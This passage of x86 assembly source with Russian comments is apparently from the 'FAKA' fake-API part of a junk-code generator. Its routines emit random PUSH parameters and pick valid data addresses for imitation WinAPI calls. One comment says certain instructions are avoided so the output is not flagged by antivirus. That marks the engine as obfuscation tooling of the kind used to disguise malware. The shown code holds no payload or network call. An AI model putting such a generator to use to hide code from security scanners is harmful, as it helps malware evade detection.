;(имена такие уж подобраны=)); 
;ВХОД:
;	ebx		-	etc
;	etc
;ВЫХОД:
;	eax		-	случайный адрес, кратный 4 (при условии, что rdata_addr - был кратен 4); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_get_rnd_rdata_addr:
	push	edx															;сохраняем edx в стеке
	push	esi
	mov		esi, [ebx].xdata_struct_addr
	assume	esi: ptr XTG_DATA_STRUCT
	mov		eax, [esi].rdata_size 										;eax = размер секции данных (области данных); 
	sub		eax, 04														;отнимаем 4, чтобы случайно не залезть на чужие адреса; 

	push	eax 
	call	[ebx].rang_addr												;получаем СЧ [0..[ebx].data_size - 4 - 1]

	mov		edx, eax
	and		edx, 03
	sub		eax, edx													;делаем полученное значение кратным четырём; 
	add		eax, [esi].rdata_addr										;добавляем адрес;
	pop		esi
	pop		edx															;восстанавливаем edx; 
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_get_rnd_rdata_addr 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_get_rnd_xdata_va   
;получение случайного адреса (в памяти, то есть VirtualAddress) в секции данных. Случайный адрес кратен четырём; 
;(имена такие уж подобраны=)); 
;там где va (и в других местах также) - VirtualAddress; 
;ВХОД:
;	ebx		-	etc
;	etc
;ВЫХОД:
;	eax		-	случайный адрес, кратный 4 (при условии, что xdata_addr - был кратен 4); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_get_rnd_xdata_va:
	push	edx															;сохраняем edx в стеке
	push	esi
	mov		esi, [ebx].xdata_struct_addr
	assume	esi: ptr XTG_DATA_STRUCT
	mov		eax, [esi].xdata_size 										;eax = размер секции данных (области данных); 
	sub		eax, 04														;отнимаем 4, чтобы случайно не залезть на чужие адреса; 

	push	eax 
	call	[ebx].rang_addr												;получаем СЧ [0..[ebx].data_size - 4 - 1]

	mov		edx, eax
	and		edx, 03
	sub		eax, edx													;делаем полученное значение кратным четырём; 
	add		eax, [esi].xdata_addr										;добавляем адрес;
	pop		esi
	pop		edx															;восстанавливаем edx; 
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_get_rnd_xdata_va
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_check_and_get_rnd_data_va 
;проверка адреса и размера данных на валидность, а также 
;получение случайного адреса в секции данных. Случайный адрес кратен четырём; 
;ВХОД:
;	ebx		-	etc;
;ВЫХОД:
;	eax		-	случайный адрес, кратный 4 (при условии, что xdata_addr (rdata_addr) - был кратен 4), 
;				либо 0, если проверка не пройдена;
;ЗАМЕТКИ:
;	проверка адреса и размера, а также получение адреса  - всё это будет происходить в одной из 
;	двух случайно выбранных областей памяти: либо в rdata, либо в xdata; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_check_and_get_rnd_data_va: 
	push	02
	call	[ebx].rang_addr

	test	eax, eax
	jne		_cngxd_

_cngrd_:																;rdata
	call	faka_check_rdata

	test	eax, eax
	je		_cngd_ret_

	call	faka_get_rnd_rdata_addr

	push	edx
	mov		edx, [ebx].xdata_struct_addr
	assume	edx: ptr XTG_DATA_STRUCT
	cmp		[edx].rdata_pva, XTG_OFFSET_ADDR							;проверим адрес: физический или виртуальный мы передавали в двигл? 
	pop		edx
	jne		_cngd_ret_

	push	eax
	push	[ebx].mapped_addr
	call	offset_to_va
	
	jmp		_cngd_ret_ 

_cngxd_:																;xdata
	call	faka_check_xdata

	test	eax, eax
	je		_cngd_ret_

	call	faka_get_rnd_xdata_va

_cngd_ret_:
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_check_and_get_rnd_data_va
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа faka_get_rnd_suit_xdata_va
;получение случайного подходящего адреса в области памяти xdata_addr + xdata_size;
;причём, адрес считается подходящим, если он + число байтов (что передаётся в EAX) 
;<= xdata_addr + xdata_size;
;ВХОД:
;	ebx		-	etc;
;	eax		-	число - кол-во байтов (для записи каких-то данных винапишкой); То есть тут такая мулька: 
;				допустим, мы генерируем функу QueryPerformanceCounter. Она принимает 1 параметр - 
;				8-байтовый адрес (адрес кратен 4 для x86) буфера, в который запишет некоторые данные. 
;				И чтобы получить адрес такого буфера, мы вызываем функу faka_get_rnd_suit_xdata_va, 
;				передавая в EAX = 8. И далее, когда эта функа получит случайный адрес, она проверит, можно 
;				ли, начиная с этого адреса, записать 8 байтов, чтобы мы остались в диапазоне переданной 
;				области памяти (xdata_addr + xdata_size). И если можно, тогда вернётся этот полученный 
;				случайный адрес; 
;ВЫХОД:
;	eax		-	0, если не удалось получить случайный подходящий адрес, иначе адрес;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_get_rnd_suit_xdata_va:
	push	ecx
	push	esi
	xchg	eax, ecx													;ecx = eax -> кол-во байтов

	call	faka_check_xdata											;проверим на валидность область xdata

	test	eax, eax													;если херня, тогда на выход
	je		_fgrsxda_ret_

	call	faka_get_rnd_xdata_va										;иначе получим случайный адрес в диапазоне (xdata_addr + xdata_size); 

	push	eax															;сохраним в стеке этот адрес
	add		eax, ecx													;добавляем переданное кол-во байтов
	mov		esi, [ebx].xdata_struct_addr
	assume	esi: ptr XTG_DATA_STRUCT									;esi - адрес структуры XTG_DATA_STRUCT; 
	mov		ecx, [esi].xdata_addr
	add		ecx, [esi].xdata_size										;ecx = конец области xdata; 
	cmp		eax, ecx													;если eax < ecx, 
	pop		eax															;тогда забираем из стэка адрес
	jb		_fgrsxda_ret_												;и на выход
	xor		eax, eax													;иначе в eax = 0, и на выход; 
_fgrsxda_ret_:
	pop		esi 
	pop		ecx 
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_get_rnd_suit_xdata_va
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вспомогательная функа faka_param_push___r32
;генерация передаваемого (входящего/входного) параметра для винапишки;
;PUSH	R32 -> push		eax   etc;
;ВХОД:
;	ebx			-	адрес структуры FAKA_FAKEAPI_GEN
;	ecx			-	маска/флаги, указывающие, как именно генерить данную команду;
;					FAKA_PUSH___R32___RND  - генерировать команду со случайным регистром;
;					FAKA_PUSH___R32___SPEC - генерировать команду с регистром, передаваемым в edx;
;	edx			-	любое значение, если флаг FAKA_PUSH___R32___RND (значение в edx будет 
;					игнорироваться); и номер регистра - если флаг FAKA_PUSH___R32___SPEC; 
;	edi			-	адрес для записи этого трэша;
;ВЫХОД:
;	(+)			-	сгенерированная команда; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

FAKA_PUSH___R32___RND		equ		01h									;значения для ecx;
FAKA_PUSH___R32___SPEC		equ		02h

FAKA_PUSH_EAX				equ		00h									;значения для edx; 
FAKA_PUSH_ECX				equ		01h
FAKA_PUSH_EDX				equ		02h
FAKA_PUSH_EBX				equ		03h
FAKA_PUSH_ESP				equ		04h
FAKA_PUSH_EBP				equ		05h
FAKA_PUSH_ESI				equ		06h
FAKA_PUSH_EDI				equ		07h

faka_param_push___r32:
	cmp		ecx, FAKA_PUSH___R32___RND
	je		_fppr32_r_
_fppr32_s_:																;генерим команду с переданным регом;
	mov		eax, edx 
	jmp		_fppr32_nxt_1_

_fppr32_r_:
	call	faka_get_rnd_r32											;генерим команду со случайным регом;

_fppr32_nxt_1_: 
	add		al, 50h														;opcode (push reg32); 
	stosb
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_param_push___r32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_param_push___imm8
;генерация передаваемого (входящего/входного) параметра для винапишки;
;PUSH	IMM8 ->	push	55h	etc
;ВХОД:
;	ebx			-	адрес структуры FAKA_FAKEAPI_GEN
;	ecx			-	маска/флаги, указывающие, как именно генерить данную команду;
;					FAKA_PUSH___IMM8___RND  - генерировать команду со случайным imm8;
;					FAKA_PUSH___IMM8___SPEC - генерировать команду с imm8, переданным в edx;
;	edx			-	любое значение, если выставлен флаг FAKA_PUSH___IMM8___RND (значение в edx будет 
;					игнорироваться); и значение imm8 - если флаг FAKA_PUSH___IMM8___SPEC; 
;	edi			-	адрес для записи этого трэша;
;ВЫХОД:
;	(+)			-	сгенерированная команда; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

FAKA_PUSH___IMM8___RND		equ		01h									;значения для ecx; 
FAKA_PUSH___IMM8___SPEC		equ		02h 

faka_param_push___imm8:
	mov		al, 6Ah
	stosb																;opcode
	cmp		ecx, FAKA_PUSH___IMM8___RND
	je		_fppimm8_r_
_fppimm8_s_:															;imm8, переданный в edx;
	mov		eax, edx
	stosb
	ret	

_fppimm8_r_:															;imm8, полученный случайным образом; 
	mov		eax, 256
	call	faka_get_rnd_num_1

	stosb
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_param_push___imm8
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_param_push___imm32
;генерация передаваемого (входящего/входного) параметра для винапишки;
;PUSH	IMM32 -> push	555h	etc
;ВХОД:
;	ebx			-	адрес структуры FAKA_FAKEAPI_GEN
;	ecx			-	маска/флаги, указывающие, как именно генерить данную команду;
;					FAKA_PUSH___IMM32___RND  - генерировать команду со случайным imm32;
;					FAKA_PUSH___IMM32___SPEC - генерировать команду с imm32, переданным в edx;
;	edx			-	любое значение, если выставлен флаг FAKA_PUSH___IMM32___RND (значение в edx будет 
;					игнорироваться); и значение imm32 - если флаг FAKA_PUSH___IMM32___SPEC;
;	edi			-	адрес для записи этого трэша;
;ВЫХОД:
;	(+)			-	сгенерированная команда; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

FAKA_PUSH___IMM32___RND		equ	01h										;значения для ecx; 
FAKA_PUSH___IMM32___SPEC	equ	02h 

faka_param_push___imm32:
	mov		al, 68h														;opcode
	stosb
	cmp		ecx, FAKA_PUSH___IMM32___RND
	je		_fppimm32_r_
_fppimm32_s_:															;imm32, переданный в edx;
	mov		eax, edx
	stosd																;imm32;
	ret	

_fppimm32_r_:															;imm32, полученный случайно; 
	mov		eax, 1000h
	call	faka_get_rnd_num_1

	add		eax, 81h 													;imm >= 81h
	stosd																;imm32
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_param_push___imm32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_param_push___m32ebpo8 
;генерация передаваемого (входящего/входного) параметра для винапишки;
;PUSH	DWORD PTR [EBP - 04]
;etc
;ВХОД:
;	ebx		-	etc; 
;	edi		-	адрес для записи этого трэша;
;ВЫХОД:
;	(+)		-	сгенерированная команда;
;	EAX		-	0, если не получилось сгенерить команду, иначе EAX != 0; 
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь (в этих функциях) нужный код; 
;!!!!! кодманды с moffs32 имеют немного другой байт и разную длину команд, так то блин; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_param_push___m32ebpo8:
	call	faka_check_local_param_num									;выберем случайно либо локальные переменные, либо входные параметры и проверим тщательно один из этих вариантов; 

	inc		eax
	je		_fppm32ebpo8_ret_											;если eax == -1, то на выход; 
	dec		eax
	push	edx
	xchg	eax, edx
	mov		ax, 75FFh
	stosw

	xchg	eax, edx													;eax = 0 либо 4;
	call	faka_write_moffs8_for_ebp									;сгенерим и запишем локальную переменную или входной параметр для ebp, например, [ebp - 14h] или [ebp + 1Ch] - -14h - локальная переменная, а 1Ch - входной параметр; 

	pop		edx
_fppm32ebpo8_ret_:	
	ret	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_param_push___m32ebpo8
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_param_push___m32
;генерация передаваемого (входящего/входного) параметра для винапишки;
;PUSH	MEM32 -> push	dword ptr [403008h]	etc
;ВХОД:
;	ebx			-	адрес структуры FAKA_FAKEAPI_GEN
;	ecx			-	маска/флаги, указывающие, как именно генерить данную команду;
;					FAKA_PUSH___M32___RND  - генерировать команду со случайным адресом (но корректным);
;					FAKA_PUSH___M32___SPEC - генерировать команду с M32, переданным в edx;
;	edx			-	любое значение, если выставлен флаг FAKA_PUSH___M32___RND (значение в edx будет 
;					игнорироваться); и значение M32 (адрес) - если флаг FAKA_PUSH___M32___SPEC;
;	edi			-	адрес для записи этого трэша;
;ВЫХОД:
;	(+)			-	сгенерированная команда; 
;	EAX			-	0, если не получилось сгенерить команду, иначе EAX != 0; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

FAKA_PUSH___M32___RND		equ		01h									;значения для ecx; 
FAKA_PUSH___M32___SPEC		equ		02h 

faka_param_push___m32:
	cmp		ecx, FAKA_PUSH___M32___RND
	je		_fppm32_r_ 
_fppm32_s_:																;M32, переданный в edx;
	mov		ax, 35FFh													;opcode + modrm
	stosw
	mov		eax, edx
	stosd																;offset32 (aka mem32);
	ret

_fppm32_r_:																;M32, сгенеренный случайным образом; 
	call	faka_check_and_get_rnd_data_va								;вызываем функу проверки переданных областей памяти (rdata & xdata), а также (в случае успеха проверки) получение случайного адреса в одной из этих областей 
																		;(из какой именно области - выбирается случайно); 

	test	eax, eax													;если херня, тогда выходим
	je		_fppm32_ret_
	
	push	eax
	mov		ax, 35FFh													;opcode + modrm
	stosw
	pop		eax
	stosd																;offset32 (aka mem32 aka m32 aka address 32-bit); 
_fppm32_ret_:	
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_param_push___m32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_param_rnd_push
;генерация передаваемого (входящего/входного) параметра для винапишки;
;какой именно параметр будет генериться - выбирается случайно
;функа вспомогательная/дополнительная; 
;здесь происходит генерация только таких параметров, чьи значения почти случайны (то есть, например, 
;не нужно искать адрес строки, адрес числа, генерировать push c каким-то конкретным значением и прочая 
;братия);
;ВХОД:
;	ebx			-	etc;
;	edi			-	адрес для записи этого трэша;
;ВЫХОД:
;	(+)			-	сгенерированная команда push <какая-то тема>
;	EAX			-	какой-то мусор; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
faka_param_rnd_push:
	push	ecx															;сохраним в стеке реги
	push	edx
	 
_fprp_get_push_:	
	push	06															;теперь случайно определим, какой именно push будем генерить;
	call	[ebx].rang_addr
	
	test	eax, eax
	je		_fprp_imm8_rnd_
	dec		eax
	je		_fprp_imm32_rnd_
	dec		eax
	je		_fprp_imm32_spec_
	dec		eax
	je		_fprp_m32_rnd_
	dec		eax
	je		_fprp_m32ebpo8_ 
	
_fprp_r32_rnd_:															;push reg32
	mov		ecx, FAKA_PUSH___R32___RND									;указываем, что надо генерить данную команду со случайным регом; 
	;mov	edx, 12345678h
	call	faka_param_push___r32										;генерируем команду;

	jmp		_fprp_ret_													;переходим на выход

_fprp_imm8_rnd_:														;push imm8
	mov		ecx, FAKA_PUSH___IMM8___RND									;указываем, что надо генерить данную команду со случайным imm8; 
	;mov	edx, 12345678h
	call	faka_param_push___imm8

	jmp		_fprp_ret_

_fprp_imm32_rnd_:														;push imm32
	mov		ecx, FAKA_PUSH___IMM32___RND								;указываем, что надо генерить данную команду со случайным imm32; 
	;mov	edx, 12345678h
	call	faka_param_push___imm32

	jmp		_fprp_ret_

_fprp_imm32_spec_:														;push imm32 (spec)
																		;imm32 - будет содержать не абы какую хуйню, а адрес на область данных (секция данных); 
	call	faka_check_and_get_rnd_data_va

	test	eax, eax													;если херня, тогда по новой определим, какой push генерить - какой-то да полюбому сгенерируется; 
	je		_fprp_get_push_
	                    
	mov		ecx, FAKA_PUSH___IMM32___SPEC								;указываем, что надо генерить данную команду push imm32 - где imm32 - это адрес на участок памяти; 
	mov		edx, eax
	call	faka_param_push___imm32

	jmp		_fprp_ret_

_fprp_m32_rnd_:															;push m32;
	mov		ecx, FAKA_PUSH___M32___RND									;указываем, что надо генерить данную команду со случайно выбранным адресом в переданной области памяти; 
	;mov	edx, 12345678h
	call	faka_param_push___m32

	test	eax, eax
	je		_fprp_get_push_
	jmp		_fprp_ret_

_fprp_m32ebpo8_:														;push dword ptr [ebp +- XXh]
	call	faka_param_push___m32ebpo8									;указываем, что надо генерить вот такую команду =)! 

	test	eax, eax
	je		_fprp_get_push_ 

_fprp_ret_:
	pop		edx 
	pop		ecx
	ret																	;на выход; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_param_rnd_push 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 


 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_param_rnd_push___imm32_imm8 
;генерация передаваемого (входящего/входного) параметра для винапишки;
;какой именно параметр (push imm8 или push imm32) будет генериться - выбирается случайно
;функа вспомогательная/дополнительная; 
;здесь происходит генерация параметров, чьи значения случайно выбираются из заданного диапазона;
;ВХОД:
;	ebx			-	etc;
;	edi			-	адрес для записи этого трэша;
;	ecx			-	число - min значение (imm), которое в результате может принять параметр
;	edx			-	число - max значение; причем edx > ecx; 
;ВЫХОД:
;	(+)			-	сгенерированная команда push imm (8 или 32), причем imm = СЧ в диапазоне 
;					[ecx ; edx - 1]; (хм, или -2?); 
;	EAX			-	какой-то мусор; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
faka_param_rnd_push___imm32_imm8: 
	push	ecx	
	push	edx 

	xchg	eax, edx
	sub		eax, ecx
	call	faka_get_rnd_num_1											;генерим СЧ 

	lea		edx, dword ptr [eax + ecx]
	cmp		edx, 80h
	jl		_fprpimm328_param_6Ah_

_fprpimm328_param_68h_:
	mov		ecx, FAKA_PUSH___IMM32___SPEC
	call	faka_param_push___imm32										;push imm32

	jmp		_fprpimm328_ret_ 

_fprpimm328_param_6Ah_:
	mov		ecx, FAKA_PUSH___IMM8___SPEC
	call	faka_param_push___imm8										;push imm8

_fprpimm328_ret_:
	pop		edx
	pop		ecx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_param_rnd_push___imm32_imm8
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 



;============================[FUNCTIONS FOR INSTR WITH EBP & moffs8]=====================================
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь (в этих функциях) нужный код; 
;!!!!! кодманды с moffs32 имеют немного другой байт и разную длину команд, так то блин;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_check_local_param_num
;Проверка на корректность кол-ва локальных переменных и входных параметров
;а также случайный выбор, какой из 2-х вариантов будем чекать тщательней для последующей его генерации; 
;ВХОД:
;	ebx						-	etc
;	[ebx].xfunc_struct_addr	-	адрес структуры XTG_FUNC_STRUCT, чьи поля будем проверять; 
;ВЫХОД:
;	eax						-	-1, если проверка не пройдена успешно, иначе 0 (если выбраны локальные 
;								переменные) либо 4 (если входные параметры);
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_check_local_param_num: 	
	push	edx															;сохраняем в стеке реги; 
	push	esi 

	push	02
	call	[ebx].rang_addr												;случайно выбираем, какой из вариантов будем тщательней проверять и в дальнейшем генерить: локальную переменную [ebp - XXh] или входной параметр [ebp + XXh];   

	shl		eax, 02														;eax = 0 или 4; 
	lea		edx, dword ptr [eax + 01]									;edx > 0; 
	mov		esi, [ebx].xfunc_struct_addr
	assume	esi: ptr XTG_FUNC_STRUCT									;esi - address of struct XTG_FUNC_STRUCT; 
	test	esi, esi													;если здесь 0, тогда структуры нет, а значит мы не генерим функу, и поэтому генерацию команд с участием ebp - не вариант делать, ибо возможны глюки и палево для ав; 
	je		_fclp_fuck_
	cmp		[esi].local_num, (84h / 04)									;иначе проверим, если кол-во локальных переменных больше данного значения, тогда выйдем - так как для такой ситуации должны генериться другие опкоды. Как вариант можно просто добавить возможность генерации этих опкодов и всё; 
	jge		_fclp_fuck_
	cmp		[esi].param_num, (80h / 04)									;etc
	jge		_fclp_fuck_
	test	eax, eax
	je		_fclp_local_
_fclp_param_:															;если выбрана проверка и последующая генерация входных параметрров, тогда проверим, вообще есть ли входные параметры в данной структуре? 
	imul	edx, [esi].param_num
	jmp		_fclp_nxt_1_
_fclp_local_:
	imul	edx, [esi].local_num										;это для локальных переменных; 
_fclp_nxt_1_:
	test	edx, edx 													;теперь проверим edx - если он = 0 (то есть, например, если выбрали локал. перем., и их кол-во = 0 - то есть их нет); 
	jne		_fclp_ret_													
_fclp_fuck_:															;тогда eax = -1 и на выход
	xor		eax, eax
	dec		eax
_fclp_ret_:
	pop		esi															;иначе eax != -1; (= 0 или 4); 
	pop		edx 
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_check_local_param_num 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;funka faka_get_moffs8_ebp_local
;получение (генерация) случайного 8-мибитного смещения в памяти для регистра ebp (локальная переменная);
;например, команда [ebp - 14h] - -14h (байт 0xEC) это и есть 8-мибитное смещение в памяти для регистра ebp; 
;ВХОД:
;	ebx		-	etc
;ВЫХОД:
;	eax		-	случайное 8-мибитное смещение (берется случайный номер локальной переменной и строится смещение); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_get_moffs8_ebp_local:												;moffs8 - mem32 offset8 ebp; 
	push	esi
	mov		esi, [ebx].xfunc_struct_addr
	assume	esi: ptr XTG_FUNC_STRUCT

	push	[esi].local_num												;выбираем случайный номер локальной переменной
	call	[ebx].rang_addr

	inc		eax															;как минимум у нас будет номер 1 - первая локальная переменная - [ebp - 04] 
	imul	eax, eax, 04												;умножаем на 4, так как размер локальной переменной = 4 байта; 
	neg		eax															;и инвертируем - так как это локал. переменная (знак "минус"); 
	pop		esi
	ret
